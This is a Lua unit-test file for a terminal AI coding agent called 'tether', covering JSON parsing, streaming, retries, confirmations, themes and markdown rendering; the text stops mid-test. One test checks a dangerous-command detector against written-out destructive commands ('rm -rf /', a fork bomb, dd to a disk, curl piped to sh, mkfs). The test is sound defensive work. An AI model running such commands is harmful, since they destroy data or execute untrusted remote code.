-- tests/lua_tests.lua — minimal Lua unit tests
-- Run: lua tests/lua_tests.lua

local passed = 0
local failed = 0

local function assert_eq(a, b, msg)
    if a ~= b then
        failed = failed + 1
        print("FAIL: " .. (msg or "") .. " — expected " .. tostring(b) .. ", got " .. tostring(a))
    else
        passed = passed + 1
    end
end

local function assert_true(v, msg)
    assert_eq(v, true, msg)
end

local function assert_false(v, msg)
    assert_eq(v, false, msg)
end

local function assert_notnil(v, msg)
    if v == nil then
        failed = failed + 1
        print("FAIL: " .. (msg or "") .. " — expected non-nil")
    else
        passed = passed + 1
    end
end

-- The shipped binary gets mkdirp/fchmod/readdir/stat from the C host
-- (src/host/main.c). The plain Lua test runtime has no C host, so these
-- stand-ins mirror the C contract and are merged into every `_G.tether`
-- mock below via host_mock{...}: names sorted without `.`/`..`, stat returns
-- {mtime, size, is_dir}, and failures return nil.
local host_fs = {}
do
    local function shq(s) return "'" .. tostring(s):gsub("'", "'\\''") .. "'" end
    function host_fs.mkdirp(path)
        local ok = os.execute("mkdir -p " .. shq(path))
        if ok == true or ok == 0 then return true end
        return nil, "mkdir failed"
    end
    function host_fs.fchmod(path, mode)
        local ok = os.execute("chmod " .. string.format("%o", mode) .. " " .. shq(path))
        if ok == true or ok == 0 then return true end
        return nil, "chmod failed"
    end
    function host_fs.readdir(path)
        local f = io.popen("ls -1A " .. shq(path) .. " 2>/dev/null")
        if not f then return nil, "readdir failed" end
        local out = f:read("*a")
        f:close()
        local names = {}
        for name in out:gmatch("[^\n]+") do names[#names + 1] = name end
        table.sort(names)
        return names
    end
    function host_fs.stat(path)
        local f = io.popen("stat -c '%Y %s %F' " .. shq(path) .. " 2>/dev/null")
        if not f then return nil end
        local out = f:read("*a")
        f:close()
        local mtime, size, kind = out:match("(%d+) (%d+) (.+)")
        if not mtime then return nil end
        return { mtime = tonumber(mtime), size =tonumber(size),
                 is_dir = kind:find("directory") ~= nil }
    end
end

-- Build a `_G.tether` mock: declared members win, the fs primitives are
-- filled in from host_fs so tests only declare what they care about.
local function host_mock(fields)
    fields = fields or {}
    fields.mkdirp = fields.mkdirp or host_fs.mkdirp
    fields.fchmod = fields.fchmod or host_fs.fchmod
    fields.readdir = fields.readdir or host_fs.readdir
    fields.stat = fields.stat or host_fs.stat
    return fields
end

-- Test json_encode/session.lua
do
    local function json_encode(obj)
        if type(obj) == "string" then
            return '"' .. obj:gsub("\\", "\\\\"):gsub('"', '\\"'):gsub("\n", "\\n"):gsub("\r", "\\r"):gsub("\t", "\\t") .. '"'
        elseif type(obj) == "number" then
            return tostring(obj)
        elseif type(obj) == "boolean" then
            return obj and "true" or "false"
        elseif type(obj) == "nil" then
            return "null"
        elseif type(obj) == "table" then
            local items = {}
            for k, v in pairs(obj) do
                local key = type(k) == "string" and '"' .. k:gsub("\\", "\\\\"):gsub('"', '\\"') .. '"' or tostring(k)
                items[#items + 1] = key .. ":" .. json_encode(v)
            end
            return "{" .. table.concat(items, ",") .. "}"
        end
        return tostring(obj)
    end

    assert_eq(json_encode({name = "test"}), '{"name":"test"}', "json_encode table")
    assert_eq(json_encode(42), "42", "json_encode number")
    assert_eq(json_encode(true), "true", "json_encode true")
    assert_eq(json_encode(false), "false", "json_encode false")
    assert_eq(json_encode("hello"), '"hello"', "json_encode string")
    assert_eq(json_encode(nil), "null", "json_encode nil")
end

-- Test parse_json_str (api.lua pattern)
do
    local function parse_json_str(s)
        local obj = {}
        for key, val in s:gmatch('"([^"]+)"[%s]*:[%s]*"([^"]*)"') do
            obj[key] = val
        end
        for key, val in s:gmatch('"([^"]+)"[%s]*:[%s]*(%d+%.?%d*)') do
            obj[key] = tonumber(val)
        end
        for key, val in s:gmatch('"([^"]+)"[%s]*:[%s]*(%S+)') do
            val = val:gsub("[,%}]$", "")
            if val == "true" then obj[key] = true elseif val == "false" then obj[key] = false end
        end
        return next(obj) and obj or nil
    end

    local r = parse_json_str('{"name": "test", "count": 42, "ok": true}')
    assert_eq(r and r.name, "test", "parse_json_str string field")
    assert_eq(r and r.count, 42, "parse_json_str number field")
    assert_eq(r and r.ok, true, "parse_json_str bool field")

    r = parse_json_str('{}')
    assert_true(r == nil or next(r) == nil, "parse_json_str empty returns nil")
end

-- Test tools.sq and within_workspace
do
    local WS = "/home/voron/project"
    local function sq(s)
        return "'" .. s:gsub("'", "'\\''") .. "'"
    end

    assert_eq(sq("hello"), "'hello'", "sq simple")
    assert_eq(sq("it's"), "'it'\\''s'", "sq escaped")

    local function to_rel(path)
        local prefix = WS .. "/"
        if path:sub(1, #prefix) == prefix then
            return path:sub(#prefix + 1)
        end
        return path
    end

    local function within(path, allow)
        local rel = to_rel(path)
        return rel ~= path or allow
    end

    assert_true(within("/home/voron/project/src", false), "within workspace")
    assert_false(within("/etc/passwd", false), "outside workspace")
    assert_true(within("/etc/passwd", true), "outside allowed")
end

-- Test resolve/to_rel
do
    local WS = "/home/voron/project"
    local function resolve(path)
        if path:find("^/") then return path end
        return WS .. "/" .. path
    end
    local function to_rel(path)
        local prefix = WS .. "/"
        if path:sub(1, #prefix) == prefix then
            return path:sub(#prefix + 1)
        end
        return path
    end

    assert_eq(resolve("src/foo.lua"), WS .. "/src/foo.lua", "resolve relative")
    assert_eq(resolve("/abs/foo.lua"), "/abs/foo.lua", "resolve absolute")
    assert_eq(to_rel(WS .. "/src/foo.lua"), "src/foo.lua", "to_rel")
end

-- Test uuid format
do
    local function uuid()
        local t = {}
        for i = 1, 32 do
            t[i] = string.format("%x", math.random(0, 15))
        end
        return table.concat(t, "")
    end
    local id = uuid()
    assert_eq(#id, 32, "uuid length")
    assert_true(id:match("^[0-9a-f]+$") ~= nil, "uuid hex")
end

-- Test glob pattern matching
do
    local function match_glob(filename, pattern)
        local lp = pattern:gsub("%.", "%%."):gsub("%.%.", ".*"):gsub("%*", ".*")
        return filename:match(lp) ~= nil
    end
    assert_true(match_glob("foo.lua", "*.lua"), "glob *.lua matches foo.lua")
    assert_false(match_glob("foo.txt", "*.lua"), "glob *.lua doesn't match foo.txt")
    assert_true(match_glob("main.py", "*.py"), "glob *.py matches main.py")
end

-- Test JSON parser (shared logic — test the actual parse_args via agent module)
do
    local names = {"tether", "config", "session", "agent", "api"}
    local originals = {}
    for _, name in ipairs(names) do originals[name] = _G[name] end
    _G.tether = host_mock{ write = function() end, getcwd = function() return "/tmp" end,
                   read_char = function() return nil end, read_char_nb = function() return nil end,
                   resize_requested = function() return false end,
                   get_terminal_size = function() return { width = 80, height = 24 } end }
    _G.config = { load = function() return { model = "test", workspace = "/tmp" } end,
                  api_key = function() return "" end }
    _G.session = {}
    _G.agent = nil
    _G.api = { stream = function() return true end, list_models = function() return {} end }
    local agent_mod = assert(loadfile("src/tether/agent.lua"))()
    -- get parse_args via upvalue of turn
    local function upvalue(fn, wanted)
        local i = 1
        while true do
            local n, v = debug.getupvalue(fn, i)
            if not n then return nil end
            if n == wanted then return v end
            i = i + 1
        end
    end
    local _ = upvalue  -- parse_args is local, not easily exposed
    -- Instead test the public M.turn path is green: parse_args now handles nested JSON
    -- We verify via a quick standalone copy check:
    local function json_parse_test(s)
        -- mirror the agent.lua json_parse with the same fix applied
        local pos = 1
        local function skip_ws()
            while pos <= #s and s:sub(pos,pos):match("[%s]") do pos = pos + 1 end
        end
        local function parse_value()
            skip_ws()
            local c = s:sub(pos,pos)
            if c == nil then return nil end
            if c == '"' then
                pos = pos + 1
                local buf = {}
                while true do
                    local ch = s:sub(pos,pos)
                    if ch == nil then break end
                    if ch == '"' then pos = pos + 1; return table.concat(buf)
                    else buf[#buf+1] = ch; pos = pos + 1 end
                end
                return table.concat(buf)
            elseif c == "{" then
                pos = pos + 1
                local obj = {}
                skip_ws()
                if s:sub(pos,pos) == "}" then pos = pos + 1; return obj end
                while true do
                    skip_ws()
                    local key
                    if s:sub(pos,pos) == '"' then key = parse_value()
                    else
                        local ks = s:match("[%w_%-]+", pos)
                        if not ks then break end
                        key = ks; pos = pos + #key
                    end
                    skip_ws()
                    if s:sub(pos,pos) ~= ":" then break end
                    pos = pos + 1
                    obj[key] = parse_value()
                    skip_ws()
                    local nx = s:sub(pos,pos)
                    if nx == "," then pos = pos + 1
                    elseif nx == "}" then pos = pos + 1; break
                    else break end
                end
                return obj
            elseif c == "[" then
                pos = pos + 1
                local arr = {}
                skip_ws()
                if s:sub(pos,pos) == "]" then pos = pos + 1; return arr end
                while true do
                    arr[#arr+1] = parse_value()
                    skip_ws()
                    local nx = s:sub(pos,pos)
                    if nx == "," then pos = pos + 1
                    elseif nx == "]" then pos = pos + 1; break
                    else break end
                end
                return arr
            elseif s:sub(pos, pos+3) == "true" then
                pos = pos + 4; return true
            elseif s:sub(pos, pos+4) == "false" then
                pos = pos + 5; return false
            elseif s:sub(pos, pos+3) == "null" then
                pos = pos + 4; return nil
            else
                local st, fin = s:find("%-?%d+%.?%d*[eE]?[%+%-]?%d*", pos)
                if st then
                    local num = s:sub(st, fin)
                    pos = fin + 1
                    return tonumber(num)
                end
                return nil
            end
        end
        return parse_value()
    end

    local obj = json_parse_test('{"path":"a","offset":3,"limit":null,"timeout":120}')
    assert_eq(obj.path, "a", "json path")
    assert_eq(obj.offset, 3, "json offset")
    assert_eq(obj.timeout, 120, "json timeout")

    local arr = json_parse_test('[1,2,3]')
    assert_eq(#arr, 3, "json array len")
    assert_eq(arr[2], 2, "json array[2]")

    local nested = json_parse_test('{"a":{"b":[{"c":true}]}}')
    assert_true(nested.a.b[1].c, "json nested")

    for _, name in ipairs(names) do
        _G[name] = originals[name]
    end
end

-- Test TUI streaming keeps assistant text in the transcript
do
    local names = {"tether", "config", "session", "agent", "api"}
    local originals = {}
    local preload = {}
    for _, name in ipairs(names) do
        originals[name] = _G[name]
        preload[name] = package.preload[name]
    end

    -- Simulate: read_char returns 17 (Ctrl+Q) to exit the loop after init
    local char_calls = 0
    local seq = { "h", "i", 13, 17 }
    _G.tether = host_mock{
        write = function(s) end,
        resize_requested = function() return false end,
        get_terminal_size = function() return (stubs and stubs.size) or { width = 80, height = 24 } end,
        getcwd = function() return "/tmp" end,
        read_char = function()
            char_calls = char_calls + 1
            local v = seq[math.min(char_calls, #seq)]
            return type(v) == "string" and (v:byte()) or v
        end,
        read_char_nb = function() return nil end,
    }
    _G.config = {
        load = function() return { model = "test-model", workspace = "/tmp", ui = { input_max_lines = 8 } } end,
        api_key = function() return "" end,
    }
    _G.session = { new_session = function() return "session-id" end }
    _G.agent = {
        turn = function(_, _, text, on_event)
            on_event({ type = "text_delta", text = "streamed text" })
            return true
        end,
    }
    _G.api = { list_models = function() return {} end }
    package.preload.tether = function() return _G.tether end
    package.preload.config = function() return _G.config end
    package.preload.session = function() return _G.session end
    package.preload.agent = function() return _G.agent end
    package.preload.api = function() return _G.api end

    local ok, err = pcall(function()
        local ui = assert(loadfile("src/tether/ui.lua"))()
        -- run the UI: types "hi" + Enter, then Ctrl+Q exits
        ui.run()
        local last = ui._transcript.last()
        assert_eq(last and last.role, "assistant", "TUI stores streamed assistant text")
        assert_eq(last and last.text, "streamed text", "TUI retains streamed text after redraw")
    end)
    if not ok then err = err end

    for _, name in ipairs(names) do
        _G[name] = originals[name]
        package.preload[name] = preload[name]
    end
    if not ok then error(err, 0) end
end

-- T15: the transport makes exactly ONE attempt and reports a classified
-- failure. add-retry-and-continuation: the retry loop moved to the agent turn,
-- so the client no longer sleeps, repeats a request, or emits
-- `retry`/`error` events. Each http_stream call plays back the script entry
-- for that request: script[n] = array of body lines.
do
    local api_mod = assert(loadfile("src/tether/api.lua"))()

    local function run_stream(script, cfg)
        local requests = 0
        local _G_old_tether = _G.tether
        _G.tether = host_mock{
            http_stream = function(_, _, _, _, on_line)
                requests = requests + 1
                for _, line in ipairs(script[requests] or {}) do
                    on_line(line)
                end
                return true
            end,
            http_get = function() return nil, "not used" end,
            sleep = function() end,
        }
        local events = {}
        local function on_event(ev) events[#events + 1] = ev end
        local ok, failure = api_mod.stream(cfg or { base_url = "http://x", model = "m" },
            "key", { { role = "user", content = "hi" } }, on_event)
        _G.tether = _G_old_tether
        return ok, failure, events, requests
    end

    -- The same call, but the transport itself fails with `err` (no bytes).
    local function run_stream_with_error(err)
        local _G_old_tether = _G.tether
        _G.tether = host_mock{
            http_stream = function() return false, err end,
            http_get = function() return nil, "not used" end,
            sleep = function() end,
        }
        local events = {}
        local ok, failure = api_mod.stream({ base_url = "http://x", model = "m" },
            "key", { { role = "user", content = "hi" } }, function(ev) events[#events + 1] = ev end)
        _G.tether = _G_old_tether
        return ok, failure
    end

    -- Case 1: a 429 body is one attempt, returned as a retryable failure
    local ok1, f1, ev1, requests1 = run_stream({
        [1] = { '{"error":{"status":429,"code":"rate_limit"}}' },
        [2] = { 'data: {"choices":[{"delta":{"content":"ok"},"finish_reason":"stop"}]}' },
    })
    assert_false(ok1, "T15 429 fails the attempt")
    assert_eq(requests1, 1, "T15 exactly one request")
    assert_true(f1 ~= nil, "T15 failure returned")
    assert_eq(f1 and f1.kind, "server", "T15 429 classified server")
    assert_true(f1 and f1.retryable, "T15 429 is retryable")
    assert_eq(f1 and f1.status, 429, "T15 status carried")
    local saw_retry, saw_error = false, false
    for _, ev in ipairs(ev1) do
        if ev.type == "retry" then saw_retry = true end
        if ev.type == "error" then saw_error = true end
    end
    assert_false(saw_retry, "T15 no retry event from the client")
    assert_false(saw_error, "T15 no error event from the client")

    -- Case 2: a valid SSE stream succeeds on the first attempt
    local ok2 = run_stream({
        [1] = { 'data: {"choices":[{"delta":{"content":"ok"},"finish_reason":"stop"}]}' },
    })
    assert_true(ok2, "T15 SSE stream succeeds")

    -- Case 3: an empty body is a retryable `empty` failure
    local ok3, f3 = run_stream({ [1] = {} })
    assert_false(ok3, "T15 empty body fails the attempt")
    assert_eq(f3 and f3.kind, "empty", "T15 empty body classified")
    assert_true(f3 and f3.retryable, "T15 empty body retryable")

    -- Case 4: a non-SSE 401 body is a permanent failure
    local ok4, f4 = run_stream({ [1] = { '{"error":{"message":"Invalid API key","status":401}}' } })
    assert_false(ok4, "T15 401 fails the attempt")
    assert_eq(f4 and f4.kind, "permanent", "T15 401 permanent")
    assert_false(f4 and f4.retryable, "T15 permanent is not retryable")

    -- Case 5: Retry-After is carried on the failure
    local ok5, f5 = run_stream({ [1] = { '{"error":{"message":"rate limit","status":429,"retry_after":5}}' } })
    assert_false(ok5, "T15 429 with retry_after fails")
    assert_eq(f5 and f5.retry_after, 5, "T15 retry_after carried")

    -- Case 6: status-only classification survives the snippet path
    local _, f6 = run_stream({ [1] = { '{"error":{"message":"boom","status":503}}' } })
    assert_eq(f6 and f6.kind, "server", "T15 503 classified server")

    -- Case 7 (add-retry-and-continuation): a transfer the user stopped with
    -- Ctrl+C is reported distinctly and is never retryable
    local ok7, f7 = run_stream_with_error("Operation was aborted by an application callback")
    assert_false(ok7, "T15 an interrupted transfer fails the attempt")
    assert_eq(f7 and f7.kind, "interrupted", "T15 aborted transfer classified interrupted")
    assert_false(f7 and f7.retryable, "T15 an interrupted transfer is not retryable")
    assert_eq(f7 and f7.message, "interrupted by user",
        "T15 an interrupted transfer says so instead of reporting a transport error")

    -- Case 8: any other transport error still classifies as a connection error
    local _, f8 = run_stream_with_error("Could not connect to server")
    assert_eq(f8 and f8.kind, "connection", "T15 a refused connection stays retryable")
    assert_true(f8 and f8.retryable, "T15 a refused connection is retryable")
end

-- T19: print mode — parse --print/-p with optional prompt, mark non-interactive
do
    -- Mirror app.lua parse_args logic inline (app.lua uses global 'arg')
    local function parse_args(args)
        local opts = { interactive = true, print_mode = false, print_prompt = nil }
        local i = 1
        while i <= #args do
            local a = args[i]
            if a == "--print" or a == "-p" then
                opts.print_mode = true
                opts.interactive = false
                if args[i + 1] and not args[i + 1]:match("^%-") then
                    opts.print_prompt = args[i + 1]
                    i = i + 1
                end
            end
            i = i + 1
        end
        return opts
    end
    local o = parse_args({ "--print", "hello" })
    assert_true(o.print_mode, "T19 print_mode true")
    assert_false(o.interactive, "T19 interactive false")
    assert_eq(o.print_prompt, "hello", "T19 prompt captured")

    local o2 = parse_args({ "-p" })
    assert_true(o2.print_mode, "T19 short -p sets print_mode")
    assert_eq(o2.print_prompt, nil, "T19 no prompt -> nil")

    local o3 = parse_args({ "--print", "--model", "gpt" })
    assert_true(o3.print_mode, "T19 print with following flags")
    assert_eq(o3.print_prompt, nil, "T19 --print followed by flag -> no prompt")
end

-- === M7 regression suite (recreated) + M8 TDD tests =========================

-- M7 helpers: module loader with _G stubs + restore
local function with_modules(env_fn, fn)
    local names = {"tether", "config", "session", "agent", "api", "tools", "ui", "diff"}
    local originals = {}
    for _, name in ipairs(names) do originals[name] = _G[name] end
    env_fn()
    local mods = {}
    local ok, err = pcall(function()
        mods.diff = assert(loadfile("src/tether/diff.lua"))()
        _G.diff = mods.diff
        mods.tools = assert(loadfile("src/tether/tools.lua"))()
        _G.tools = mods.tools
        mods.api = assert(loadfile("src/tether/api.lua"))()
        _G.api = mods.api
        mods.agent = assert(loadfile("src/tether/agent.lua"))()
        _G.agent = mods.agent
        mods.session = assert(loadfile("src/tether/session.lua"))()
        _G.session = mods.session
        mods.config = assert(loadfile("src/tether/config.lua"))()
        _G.config = mods.config
        mods.ui = assert(loadfile("src/tether/ui.lua"))()
        _G.ui = mods.ui
        fn(mods)
    end)
    for _, name in ipairs(names) do _G[name] = originals[name] end
    if not ok then error(err, 0) end
end

local function base_env()
    _G.tether = host_mock{
        getcwd = function() return "/tmp/ws" end,
        realpath = function(p) return p end,
        exec = function() return true, 0 end,
        write = function() end, sleep = function() end,
        http_stream = function() return true end,
        http_get = function() return "", nil end,
        get_terminal_size = function() return (stubs and stubs.size) or { width = 80, height = 24 } end,
        read_char = function() return nil end,
        read_char_nb = function() return nil end,
        resize_requested = function() return false end,
        is_tty = function() return false end,
    }
    _G.config = { get_system_prompt = function() return nil end }
    _G.session = { append = function() end }
end

-- M7/T24: raw tool_call argument deltas (D2a/D2b) + D6 hang regression
with_modules(base_env, function(mods)
    local api = mods.api
    assert_notnil(api.parse_sse_line, "T24 api.parse_sse_line exported")

    local evs = {}
    -- wire format: \92 = backslash in Lua literals, explicit for clarity
    api.parse_sse_line('data: {"choices":[{"delta":{"tool_calls":[{"index":0,"id":"call_1","function":{"name":"read","arguments":"{\92"path\92":\92"a"}}]}}]}',
        function(ev) evs[#evs + 1] = ev end)
    api.parse_sse_line('data: {"choices":[{"delta":{"tool_calls":[{"index":0,"function":{"arguments":".lua","extra":1}}]}}]}',
        function(ev) evs[#evs + 1] = ev end)

    local saw_start, saw_delta = false, false
    local arg_parts = {}
    for _, ev in ipairs(evs) do
        if ev.type == "tool_call_start" then saw_start = true end
        if ev.type == "tool_call_delta" then
            saw_delta = true
            arg_parts[#arg_parts + 1] = ev.arguments
            if ev.id then assert_eq(ev.id, "call_1", "T24 id-delta carries id") end
            if ev.index then assert_eq(ev.index, 0, "T24 index-delta carries index") end
        end
    end
    assert_true(saw_start, "T24 D2a tool_call_start emitted")
    assert_true(saw_delta, "T24 D2a delta emitted for id-less chunk")
    assert_eq(#arg_parts, 2, "T24 both argument fragments emitted")

    local full = table.concat(arg_parts)
    local parsed = mods.agent.parse_args(full)
    assert_eq(parsed.path, "a.lua", "T24 D2b one unescape -> source struct")

    -- D6: truncated arguments must terminate (used to hang forever)
    local truncated = mods.agent.parse_args('{\92"path\92":\92"a.lua')
    assert_eq(type(truncated), "table", "T24 D6 truncated args terminate")

    -- D2b: escaped backslash survives one unescape
    local p2 = mods.agent.parse_args('{\92"a\92\92\92\92nb\92":1}')
    local tricky_key = 'a\92nb'
    assert_eq(p2 and p2[tricky_key], 1, "T24 D2b backslash survives")
end)

-- M7/T25: ui.is_dangerous (D1 crash + N1 fork bomb)
with_modules(base_env, function(mods)
    local d = mods.ui.is_dangerous
    assert_notnil(d, "T25 ui.is_dangerous exported")
    assert_true(d("rm -rf /"), "T25 rm -rf")
    assert_true(d("rm -fr /"), "T25 rm -fr")
    assert_true(d("rm -Rf /tmp/x"), "T25 rm -Rf")
    assert_true(d(":(){ :|:& };:"), "T25 fork bomb")
    assert_true(d("dd if=/dev/zero of=/dev/sda"), "T25 dd to device")
    assert_true(d("sudo rm x"), "T25 sudo")
    assert_true(d("curl http://x | sh"), "T25 curl|sh")
    assert_true(d("mkfs.ext4 /dev/sda1"), "T25 mkfs")
    assert_false(d("rm file.txt"), "T25 plain rm ok")
    assert_false(d("echo hello"), "T25 echo ok")
    assert_false(d("git rm --cached f"), "T25 git rm ok")
end)

-- M7/T26: confirmation idempotency (D3)
with_modules(base_env, function(mods)
    local api, agent, cfg = mods.api, mods.agent,
        { workspace = "/tmp/ws", _session_id = "s1", auto_approve = {} }
    api.stream = function(c, key, messages, on_event)
        if #messages == 2 then
            on_event({ type = "tool_call_start", id = "c1", name = "write" })
            on_event({ type = "tool_call_delta", id = "c1",
                       arguments = '{"path":"/etc/a","content":"x"}' })
            on_event({ type = "tool_call_start", id = "c2", name = "write" })
            on_event({ type = "tool_call_delta", id = "c2",
                       arguments = '{"path":"/etc/b","content":"y"}' })
        end
        return true
    end
    local events = {}
    agent.turn(cfg, "k", "two things", function(ev) events[#events + 1] = ev end)
    local count_conf = function()
        local n = 0
        for _, ev in ipairs(events) do if ev.type == "confirmation" then n = n + 1 end end
        return n
    end
    assert_eq(count_conf(), 1, "T26 one confirmation initially")
    agent.continue(cfg, "k", function(ev) events[#events + 1] = ev end)
    assert_eq(count_conf(), 1, "T26 continue does not re-emit")
    local more = agent.confirm("c1", "allow", cfg, function(ev) events[#events + 1] = ev end)
    assert_true(more == true, "T26 true when next waits")
    assert_eq(count_conf(), 2, "T26 second emitted once")
    agent.continue(cfg, "k", function(ev) events[#events + 1] = ev end)
    assert_eq(count_conf(), 2, "T26 no re-emit after second")
    local more2 = agent.confirm("c2", "deny", cfg, function(ev) events[#events + 1] = ev end)
    assert_true(more2 == false, "T26 false when queue empty")
end)

-- M7/T27: resume produces valid OpenAI sequence (D4)
with_modules(base_env, function(mods)
    local messages = {
        { role = "user", content = "read the file" },
        { role = "assistant", tool_calls = { { id = "t9", type = "function",
            ["function"] = { name = "read", arguments = '{"path":"f.lua"}' } } } },
        { role = "tool", tool_call_id = "t9", content = "5 стр." },
        { role = "assistant", content = "done" },
    }
    local agent, api = mods.agent, mods.api
    agent.clear()
    for _, msg in ipairs(messages) do
        if msg.role == "user" then agent.add_user(msg.content)
        elseif msg.role == "assistant" then
            if msg.tool_calls then agent.add_assistant({ tool_calls = msg.tool_calls })
            else agent.add_assistant(msg.content) end
        elseif msg.role == "tool" then
            agent.add_tool_result(msg.tool_call_id, msg.content or "")
        end
    end
    local history = agent.get_history()
    local ok_contract = true
    for i, m in ipairs(history) do
        if m.role == "assistant" and type(m.content) == "table" and m.content.tool_calls then
            local nxt = history[i + 1]
            if not nxt or nxt.role ~= "tool"
                or nxt.tool_call_id ~= m.content.tool_calls[1].id then
                ok_contract = false
            end
        end
    end
    assert_true(ok_contract, "T27 D4 tool_call followed by tool result")
    local encoded = api.encode_messages(history)
    assert_true(encoded:find('"tool_call_id":"t9"', 1, true) ~= nil,
        "T27 D4 request carries tool result")
end)

-- M7/T28: non-SSE error body -> error event (D5b)
with_modules(base_env, function(mods)
    local old = _G.tether
    _G.tether = host_mock{
        http_stream = function(_, _, _, _, on_line)
            on_line('{"error":{"message":"Invalid API key","status":401}}')
            return true
        end,
        http_get = function() return nil, "not used" end,
        sleep = function() end,
    }
    local events = {}
    local ok, failure = mods.api.stream({ base_url = "http://x", model = "m" },
        "badkey", { { role = "user", content = "hi" } },
        function(ev) events[#events + 1] = ev end)
    _G.tether = old
    assert_false(ok, "T28 401 body fails stream")
    assert_eq(failure and failure.kind, "permanent", "T28 401 classified permanent")
    assert_true(failure and failure.message:find("401", 1, true) ~= nil, "T28 status in message")
    -- add-retry-and-continuation: the client reports the failure instead of
    -- emitting an `error` event; the retry loop decides whether that surfaces.
    local saw_error = false
    for _, ev in ipairs(events) do
        if ev.type == "error" then saw_error = true end
    end
    assert_false(saw_error, "T28 no error event from the client")
end)

-- M7/T29: session ts round-trip as string (N2) via _session_dir seam
with_modules(base_env, function(mods)
    local session = mods.session
    local tmpdir = "/tmp/tether_test_sessions"
    os.execute("rm -rf " .. tmpdir)
    session._session_dir = tmpdir
    local id = session.new_session("/tmp/ws", "m")
    assert_notnil(id, "T29 session created")
    session.append(id, { ts = os.date(), type = "session_end", meta = { workspace = "/tmp/ws" } })
    local evs = session.read(id)
    assert_eq(#evs, 2, "T29 two events")
    assert_true(type(evs[2].ts) == "string" and #evs[2].ts > 0, "T29 N2 ts is string")
    os.execute("rm -rf " .. tmpdir)
end)

-- M8/T30: ASCII mode — glyph mapping, spinner, no high bytes (R1)
with_modules(base_env, function(mods)
    mods.ui._ascii_mode = true -- test seam (env is not ASCII in CI)
    assert_notnil(mods.ui.to_ascii, "T30 ui.to_ascii exported")
    local glyph_cases = {
        { "●", "*" }, { "⚙", "[t]" }, { "›", ">" }, { "✗", "[x]" }, { "✓", "[ok]" }, { "✻", "*" },
        { "↻", "[r]" }, { "⏹", "[x]" }, { "⚠", "!" }, { "▸", ">" }, { "▾", "v" },
        { "┌", "+" }, { "┐", "+" }, { "└", "+" }, { "┘", "+" }, { "─", "-" },
        { "│", "|" }, { "•", "-" }, { "…", "..." }, { "▓", "#" }, { "░", "-" },
        { "↑", "^" }, { "↓", "v" }, { "←", "<" }, { "→", ">" },
        -- pi-style 1.2: scroll-label glyphs the box rules carry
        { "↑ 3 more", "^ 3 more" }, { "↓ 2 more", "v 2 more" },
    }
    for _, case in ipairs(glyph_cases) do
        local out = mods.ui.to_ascii(case[1])
        assert_eq(out, case[2], "T30 ascii " .. case[1])
        for i = 1, #out do
            assert_true(out:byte(i) <= 0x7F, "T30 byte <= 0x7F for " .. case[1])
        end
    end
    assert_eq(mods.ui.to_ascii("⚠ потенциально опасная"),
              "! потенциально опасная", "T30 cyrillic preserved")
    assert_notnil(mods.ui.SPINNER_ASCII, "T30 SPINNER_ASCII exported")
    for _, frame in ipairs(mods.ui.SPINNER_ASCII) do
        for i = 1, #frame do
            assert_true(frame:byte(i) <= 0x7F, "T30 spinner frame ascii")
        end
    end
end)

-- M8/T31: themes (role→sgr), ui.wrap, mono has no SGR (R2)
with_modules(base_env, function(mods)
    local ui = mods.ui
    assert_notnil(ui.set_theme, "T31 ui.set_theme exported")
    assert_notnil(ui.THEMES, "T31 THEMES exported")

    -- default theme exists with core roles
    local t = ui.THEMES["default"]
    assert_notnil(t, "T31 default theme exists")
    for _, role in ipairs({ "accent", "warn", "error", "success", "dim", "reverse" }) do
        assert_notnil(t[role], "T31 default role " .. role)
    end

    -- unknown theme -> fallback to default
    ui.set_theme("nonexistent")
    assert_eq(ui._theme_name, "default", "T31 unknown theme falls back")

    -- mono theme: role lookups yield no SGR codes
    ui.set_theme("mono")
    assert_eq(ui._theme_name, "mono", "T31 mono selected")
    local s = ui.sgr_role("accent", "x")
    assert_eq(s, "x", "T31 mono strips SGR")

    ui.set_theme("default")
    local s2 = ui.sgr_role("accent", "x")
    assert_true(#s2 > #"x", "T31 default accent wraps text")
    assert_true(s2:find("\27[", 1, true) ~= nil, "T31 default emits SGR")

    -- wrap toggle honored by wrap() through seam
    assert_notnil(ui.set_wrap, "T31 ui.set_wrap exported")
    ui.set_wrap(false)
    local lines = ui.wrap_lines("hello world this is long", 10)
    assert_eq(#lines, 1, "T31 wrap=false truncates to one line")
    ui.set_wrap(true)
    local lines2 = ui.wrap_lines("hello world this is long", 10)
    assert_true(#lines2 > 1, "T31 wrap=true wraps")
end)

-- M8/T32: markdown-lite md.render_entry (R4)
with_modules(base_env, function(mods)
    local ui = mods.ui
    -- 7.x: unit tests render md_render without M.run; force depth "none"
    -- so SGR-free rendering is deterministic regardless of COLORTERM env
    ui._color_depth = "none"
    assert_notnil(ui.md_render, "T32 ui.md_render exported")
    local render = ui.md_render

    -- plain text passes through
    local out = render("just text", 40)
    assert_eq(#out, 1, "T32 plain text one line")

    -- code block with lang: framed, lang in top border
    out = render("before\n```lua\nlocal x = 1\nlocal y = 2\n```\nafter", 40)
    -- expected: "before", border, 2 code lines, border, "after"
    assert_eq(#out, 6, "T32 code block line count: " .. #out)
    assert_true(out[2]:find("lua", 1, true) ~= nil, "T32 lang in border")
    assert_true(out[2]:find("+", 1, true) ~= nil or out[2]:find("┌", 1, true) ~= nil,
        "T32 top border char")
    local joined = table.concat(out, "\n")
    assert_true(joined:find("local x = 1", 1, true) ~= nil, "T32 code line preserved")

    -- inline code is preserved with markers stripped (color is role-based)
    out = render("run `npm test` now", 40)
    joined = table.concat(out)
    assert_true(joined:find("npm test", 1, true) ~= nil, "T32 inline code text")
    assert_true(joined:find("`", 1, true) == nil, "T32 backticks stripped")

    -- bold stripped, text kept
    out = render("**bold** word", 40)
    joined = table.concat(out)
    assert_true(joined:find("bold", 1, true) ~= nil, "T32 bold text kept")
    assert_true(joined:find("%*%*", 1, true) == nil, "T32 ** stripped")

    -- heading
    out = render("# Title", 40)
    assert_eq(#out, 2, "T32 heading + blank line")
    assert_true(out[1]:find("Title", 1, true) ~= nil, "T32 heading text")

    -- list items get bullet prefix
    out = render("- one\n- two", 40)
    assert_eq(#out, 2, "T32 list 2 items")
    local bullet = (mods.ui._ascii_mode) and "-" or "•"
    assert_true(out[1]:find(bullet, 1, true) ~= nil, "T32 bullet prefix")

    -- escaping: backtick escaped is literal
    out = render("\\`not code\\`", 40)
    joined = table.concat(out)
    assert_true(joined:find("not code", 1, true) ~= nil, "T32 escaped text kept")

    -- wide unicode width: uses ulen not bytes (display width via utf8.len)
    out = render("привет мир большой текст строки", 10)
    for _, l in ipairs(out) do
        local w = utf8.len(l) or #l
